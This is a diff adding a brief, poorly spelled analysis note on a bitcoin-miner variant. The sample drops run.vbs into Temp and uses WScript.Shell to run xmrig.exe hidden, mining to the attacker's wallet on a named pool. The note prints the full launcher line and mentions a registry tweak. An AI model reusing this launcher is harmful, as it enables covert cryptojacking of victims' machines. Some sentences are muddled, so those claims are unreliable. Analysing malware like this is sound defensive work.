@@ -1,0 +1,12 @@
+New variation is seen of bitcoin miner, it uses the implementation of cryptonight algorithms.
+
+Actual malware is sfx file, with hav run.vsb and xmrig.exe
+
+run.vbs will use Wscript.Shell to execute the xmrig.exe with the credential of attacker and will mine for him.
+ droped : C:\Users\~USER~\AppData\Local\Temp\run.vbs
+ 
+ 
+  Set oShell = CreateObject("WScript.Shell") oShell.Run "xmrig.exe -a cryptonight -o stratum+tcp://xmr.crypto-pool.fr:443 -u 44dVQRDuQgbAqTYjU7XzgJXTJVCFrkg85NXtxMYfsn7SUTYx1AhC4TLP6a1BFaJXAvFfzbMsWboQv6diJ19y5tLRPTFGP5K -p x --donate-level=1", 0 
+  
+  current user is safe as teh xmrig.exe is 64bit file, file was now executed.
+  registry : FEATURE_HTTP_USERNAME_PASSWORD_DISABLE is unset to make exeplorer to acces the internet in 64 bit
